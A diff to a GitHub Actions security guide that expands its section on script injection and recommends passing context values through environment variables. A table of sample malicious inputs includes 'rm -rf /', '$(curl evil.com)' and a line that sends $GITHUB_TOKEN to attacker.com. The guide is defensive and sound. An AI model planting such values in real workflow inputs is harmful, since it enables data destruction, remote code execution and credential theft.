@@ -123,20 +123,85 @@ Use OpenID Connect (OIDC) for cloud provider authentication instead of long-live
 
 ### Script Injection Prevention
 
-Never use user-controlled values directly in shell commands. Always assign to environment variables first so they're treated as data, not code.
+Script injection is a **critical security vulnerability** where user-controlled values in shell commands are interpreted as code, not data. Always assign context values to environment variables first to prevent code execution.
 
-**Bad — Vulnerable to injection:**
+#### Understanding the Risk
+
+When you use context variables directly in `run:` scripts, the shell interprets them as **code**:
 
 ```yaml
-- run: echo "${{ github.event.pull_request.title }}"
+# ❌ VULNERABLE
+- run: curl -X POST https://api.example.com/deploy -d "user=${{ github.actor }}"
 ```
 
-**Good — Safe approach:**
+#### Common Attack Scenarios
+
+If `github.actor`, PR titles, or similar values contain shell metacharacters, injection can occur:
+
+| Scenario | Malicious Value | Result |
+|----------|-----------------|--------|
+| Command injection | `test; rm -rf /` | Executes arbitrary commands |
+| Command substitution | `$(curl evil.com)` | Executes remote code |
+| Quote escaping | `foo'bar'$(whoami)` | Breaks syntax, executes code |
+| Secret exfiltration | `pass; curl attacker.com?token=$GITHUB_TOKEN` | Leaks credentials to attacker |
+
+#### Safe Pattern: Use Environment Variables
+
+**Always** assign user-controlled values to environment variables first, then reference them:
 
 ```yaml
-- env:
+# ✅ SAFE
+- name: Deploy safely
+  env:
+    ACTOR: ${{ github.actor }}
+    BRANCH: ${{ github.ref }}
+    API_KEY: ${{ secrets.API_KEY }}
+  run: |
+    curl -X POST https://api.example.com/deploy \
+      -d "user=$ACTOR" \
+      -d "branch=$BRANCH" \
+      -d "token=$API_KEY"
+```
+
+**Why it works:** Environment variables are treated as literal data by the shell. Metacharacters like `$`, `;`, `|` are literal text, not interpreted as code.
+
+#### Approach Comparison
+
+| Approach | Usage | Risk Level | Notes |
+|----------|-------|-----------|-------|
+| Direct interpolation | `echo "${{ vars.FOO }}"` | 🔴 Critical | Vulnerable to injection attacks |
+| Env variable assignment | `env: { VAR: ${{ vars.FOO }} }` then `echo "$VAR"` | 🟢 Safe | **Recommended approach** |
+| Single quotes | `echo '${{ vars.FOO }}'` | 🟡 Risky | Prevents some attacks but not all |
+
+#### Key Rules
+
+**✅ Must Do:**
+- **Always** assign context values to env variables before using in shell
+- Use double quotes when referencing env variables: `"$VAR"` not `$VAR`
+- Mask sensitive values with `::add-mask::` before use in scripts
+
+**❌ Must NOT Do:**
+- Direct interpolation in run commands: `${{ vars.FOO }}`
+- Inline execution of secrets: `${{ secrets.PASS }}`
+- Command substitution with context values: `echo "$(eval ${{ vars.CMD }})"`
+- Unquoted variables: `echo $VAR` (allows word splitting and globbing)
+
+#### Best Practice Template
+
+```yaml
+- name: Process user input safely
+  env:
+    # Assign ALL dynamic values from context/secrets/variables first
     PR_TITLE: ${{ github.event.pull_request.title }}
-  run: echo "$PR_TITLE"
+    BUILD_ID: ${{ github.run_id }}
+    CONFIG: ${{ vars.MY_CONFIG }}
+    API_TOKEN: ${{ secrets.API_TOKEN }}
+  run: |
+    # Reference via environment variables only
+    echo "PR: $PR_TITLE"
+    curl -H "Authorization: Bearer $API_TOKEN" \
+      -d "config=$CONFIG&build=$BUILD_ID" \
+      https://api.example.com/deploy
 ```
 
 ### Credential Persistence
